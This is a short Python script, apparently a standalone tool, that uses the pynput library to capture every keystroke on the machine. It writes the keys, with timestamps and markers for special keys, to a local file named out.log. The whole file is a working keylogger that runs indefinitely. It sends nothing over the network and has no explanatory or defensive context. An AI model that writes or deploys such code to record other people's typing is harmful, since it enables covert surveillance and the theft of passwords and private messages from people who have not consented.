import time
from pynput import keyboard # pip install pynput
from datetime import datetime

def dt_now():
    return datetime.now().strftime("%Y-%m-%d, %H:%M")

def append(path, text):
    with open(path, "a+") as f:
        f.write(text)

def on_press(key):
    global current_dt # datetime
    global current_spc, spc_count  # special character
    if dt_now() != current_dt:
        current_dt = dt_now()
        append(output_path, f"\n{current_dt}\n") 
    try:
        k = key.char
        append(output_path, f"{k}") 
    except:
        k = key.name        
        if k == 'space': text = " "
        elif k == 'enter': text = "\n"
        else:
            if k == current_spc:
                spc_count += 1
                text = ""
            else:
                current_spc = k
                if spc_count > 1:
                    append(output_path, f"(x{spc_count})")
                text = f"[{k}]"
        append(output_path, text)

output_path = "out.log"
current_spc, spc_count = "", 0
listener = keyboard.Listener(on_press=on_press)
current_dt = dt_now()
append(output_path, f"{current_dt}\n")
listener.start()
while True:
    time.sleep(100000) # zzz...